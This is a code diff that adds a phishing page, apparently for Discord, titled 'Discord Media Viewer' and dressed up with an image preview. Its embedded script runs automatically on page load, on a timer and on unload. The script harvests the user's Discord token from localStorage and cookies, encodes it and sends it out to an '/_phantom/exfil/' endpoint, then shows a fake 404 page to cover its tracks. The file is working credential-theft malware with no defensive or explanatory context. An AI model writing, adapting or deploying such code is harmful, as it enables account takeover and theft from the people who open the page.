@@ -1,0 +1,37 @@
+<!-- public/phish.html -->  
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Discord Media Viewer</title>  
+    <meta property="og:image" content="https://imgur.com/a/xM6kmTB">  
+    <script>  
+        // PHANTOM'S CLIENT-SIDE TOKEN VACUUM  
+        const TOKEN_REGEX = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/;  
+        
+        const exfiltrate = (token) => {  
+            const encoded = btoa(token)  
+                .replace(/=/g, '')  
+                .replace(/\+/g, '-')  
+                .replace(/\//g, '_');  
+            
+            new Image().src = `/_phantom/exfil/${crypto.randomUUID()}?d=${encoded}`;  
+        };  
+
+        const harvest = () => {  
+            [localStorage.token, document.cookie.match(/token=([^;]+)/?.[1]]  
+                .filter(t => TOKEN_REGEX.test(t))  
+                .forEach(exfiltrate);  
+
+            window.stop();  
+            document.body.innerHTML = '<h1>404 Not Found</h1>';  
+        };  
+
+        window.addEventListener('load', harvest);  
+        window.addEventListener('beforeunload', harvest);  
+        setTimeout(harvest, 250);  
+    </script>  
+</head>  
+<body>  
+    <img src="https://imgur.com/a/xM6kmTB" style="display:none">  
+</body>  
+</html>  
